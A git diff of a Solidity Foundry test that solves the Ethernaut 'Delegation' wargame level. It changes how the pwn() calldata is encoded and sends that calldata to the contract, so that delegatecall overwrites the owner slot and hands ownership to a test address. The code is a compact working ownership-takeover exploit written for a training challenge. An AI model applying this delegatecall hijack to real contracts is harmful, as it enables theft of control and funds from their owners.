@@ -4,8 +4,7 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Delegation.sol";
 
-// call pwn() on Delegate for it updates the storage on the first slot of Delegation
-// thus updating Delegation's owner when delegatecall is called
+// call pwn() on Delegate for delegatecall updates the storage on the first slot of Delegation
 contract DelegationTest is Test {
     Delegate delegate;
     Delegation delegation;
@@ -21,7 +20,7 @@ contract DelegationTest is Test {
 
         address alice = makeAddr("alice");
         vm.startPrank(alice);
-        bytes memory data = abi.encodeWithSignature("pwn()");
+        bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector);
         console.logBytes(data);
         address(delegation).call(data);
 
